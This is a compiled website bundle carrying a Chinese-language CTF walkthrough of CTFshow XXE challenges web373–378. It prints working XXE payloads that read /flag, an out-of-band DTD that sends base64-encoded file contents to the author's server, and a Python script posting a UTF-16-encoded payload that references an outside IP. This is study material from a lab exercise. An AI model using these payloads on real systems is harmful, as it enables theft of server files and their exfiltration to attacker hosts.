"use strict";(self.webpackChunkmu_website=self.webpackChunkmu_website||[]).push([[5177],{20095:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>i,contentTitle:()=>c,default:()=>h,frontMatter:()=>a,metadata:()=>d,toc:()=>l});var t=s(74848),r=s(28453);const a={},c=void 0,d={id:"Web/CTFshow\u5165\u95e8/XXE",title:"XXE",description:"web373",source:"@site/docs/Web/CTFshow\u5165\u95e8/15-XXE.md",sourceDirName:"Web/CTFshow\u5165\u95e8",slug:"/Web/CTFshow\u5165\u95e8/XXE",permalink:"/docs/Web/CTFshow\u5165\u95e8/XXE",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/Web/CTFshow\u5165\u95e8/15-XXE.md",tags:[],version:"current",sidebarPosition:15,frontMatter:{},sidebar:"Web",previous:{title:"SSTI",permalink:"/docs/Web/CTFshow\u5165\u95e8/SSTI"},next:{title:"\u9ed1\u76d2\u6d4b\u8bd5",permalink:"/docs/Web/CTFshow\u5165\u95e8/\u9ed1\u76d2\u6d4b\u8bd5"}},i={},l=[{value:"web373",id:"web373",level:3},{value:"web374-376",id:"web374-376",level:3},{value:"web377",id:"web377",level:3},{value:"web378",id:"web378",level:3}];function o(e){const n={a:"a",code:"code",h3:"h3",img:"img",p:"p",pre:"pre",strong:"strong",...(0,r.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h3,{id:"web373",children:"web373"}),"\n",(0,t.jsxs)(n.p,{children:["XXE(XML External Entity Injection) \u5168\u79f0\u4e3a XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u3002\u6ce8\u5165\u7684\u662fXML",(0,t.jsx)(n.strong,{children:"\u5916\u90e8\u5b9e\u4f53"})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220116101033603",src:s(86603).A+"",width:"768",height:"507"})}),"\n",(0,t.jsxs)(n.p,{children:["\u53c2\u8003\u6587\u7ae0\uff1a",(0,t.jsx)(n.a,{href:"https://xz.aliyun.com/t/3357",children:"https://xz.aliyun.com/t/3357"})]}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:"libxml_disable_entity_loader(false);"}),":\u7981\u6b62\u52a0\u8f7d\u5916\u90e8\u5b9e\u4f53\u3002\u4e00\u4e2a\u5b9e\u4f53\u7531\u4e09\u90e8\u5206\u6784\u6210: \u4e00\u4e2a\u548c\u53f7 (&), \u4e00\u4e2a\u5b9e\u4f53\u540d\u79f0, \u4ee5\u53ca\u4e00\u4e2a\u5206\u53f7 ( ; )"]}),"\n",(0,t.jsx)(n.p,{children:"flag\u5728flag\u91cc"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-payload",children:'<?xml version="1.0" encoding="UTF-8"?>\r\n<!DOCTYPE XXE [\r\n<!ENTITY cmd SYSTEM "file:///flag">\r\n]>\r\n<mumuzi>\r\n<ctfshow>&cmd;</ctfshow>\r\n</mumuzi>\n'})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220116101433970",src:s(20782).A+"",width:"993",height:"461"})}),"\n",(0,t.jsx)(n.h3,{id:"web374-376",children:"web374-376"}),"\n",(0,t.jsx)(n.p,{children:"\u548c373\u7684\u533a\u522b\u662f\u6ca1\u6709echo $ctfshow;\uff0c\u5373\u65e0\u56de\u663e"}),"\n",(0,t.jsx)(n.p,{children:"\u56e0\u4e3a\u6ca1\u6709\u56de\u663e\uff0c\u6240\u4ee5\u53ea\u80fd\u60f3\u529e\u6cd5\u5e26\u5230\u81ea\u5df1vps\u91cc\u3002"}),"\n",(0,t.jsx)(n.p,{children:"\u540e\u9762\u7684\u9898\u628axml\u5934\u7ed9\u8fc7\u6ee4\u6389\u4e86\uff0c\u8fd9\u91cc\u5728vps\u4e0a\u521b\u5efa\u4e00\u4e2adtd\u6587\u4ef6\uff0c\u7528\u4e8e\u53cd\u5f39shell"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-php",children:"#test.dtd\r\n<!ENTITY % dtd \"<!ENTITY &#x25; xxe  SYSTEM 'http://xxx:10086/%file;'> \">\r\n%dtd;\r\n%xxe;\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u76d1\u542c10086\u7aef\u53e3"}),"\n",(0,t.jsx)(n.p,{children:"\u7136\u540ePOST\u53d1\u5305\u5373\u53ef\u5728vps\u4e0a\u6536\u5230"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-php",children:'<!DOCTYPE ANY [\r\n<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">\r\n<!ENTITY % aaa SYSTEM "http://xxx/test.dtd">\r\n%aaa;\r\n]>\r\n<root>1</root>\r\n\n'})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220203172555229",src:s(80037).A+"",width:"1219",height:"192"})}),"\n",(0,t.jsx)(n.p,{children:"\u5176\u5b9e\u5f53\u65f6\u8fd9\u91cc\u5361\u4e86\u8bb8\u4e45\uff0c4\u53f0vps\uff0c\u6709\u4e00\u53f0\u4e00\u76f4\u90fd\u5173\u4e86\u5b89\u5168\u7ec4\uff08\u53ea\u5f00\u653e\u4e86\u4e24\u5e38\u7528\u7aef\u53e3\uff09\uff0c\u6709\u4e00\u53f0\u6ca1php\u73af\u5883\uff0c\u6709\u4e00\u53f0\u88abStreamlit\u5360\u7528\uff0c\u8fd9\u53f0\u5c31\u662f\u521a\u521a\u624d\u88c5\u7684php\u73af\u5883\u3002\u81ea\u5df1\u7ed9\u81ea\u5df1\u6574\u9ebb\u4e86"}),"\n",(0,t.jsx)(n.h3,{id:"web377",children:"web377"}),"\n",(0,t.jsx)(n.p,{children:"\u65b9\u6cd5\u548c\u4e0a\u9762\u4e00\u6837\uff0c\u4f46\u662f\u8fc7\u6ee4http\uff0c\u9700\u8981\u7f16\u7801\u7ed5\u8fc7\u3002"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:"import requests\r\nurl = 'http://b70f356b-ab20-4df6-b661-d7827322fc80.challenge.ctf.show/'\r\ndata = '''<!DOCTYPE ANY [\r\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\">\r\n<!ENTITY % aaa SYSTEM \"http://101.35.244.30/test.dtd\">\r\n%aaa;\r\n]>\r\n<root>1</root>'''\r\nr = requests.post(url=url,data=data.encode('utf-16'))\n"})}),"\n",(0,t.jsx)(n.h3,{id:"web378",children:"web378"}),"\n",(0,t.jsx)(n.p,{children:"\u5fd2\u6807\u51c6\u7684 XXE"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-payload",children:'<!DOCTYPE XXE [\r\n<!ENTITY cmd SYSTEM "file:///flag">\r\n]>\r\n<user><username>&cmd;</username>\r\n</user>\n'})})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(o,{...e})}):o(e)}},86603:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/image-20220116101033603-3f743fcc26a23a6104f2af28ebe8a653.png"},20782:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/image-20220116101433970-b5baf1bc170b392f0c461ad8409be1dc.png"},80037:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/image-20220203172555229-a17d065ad42742ab8cbd2bdbf17d0745.png"},28453:(e,n,s)=>{s.d(n,{R:()=>c,x:()=>d});var t=s(96540);const r={},a=t.createContext(r);function c(e){const n=t.useContext(a);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function d(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:c(e.components),t.createElement(a.Provider,{value:n},e.children)}}}]);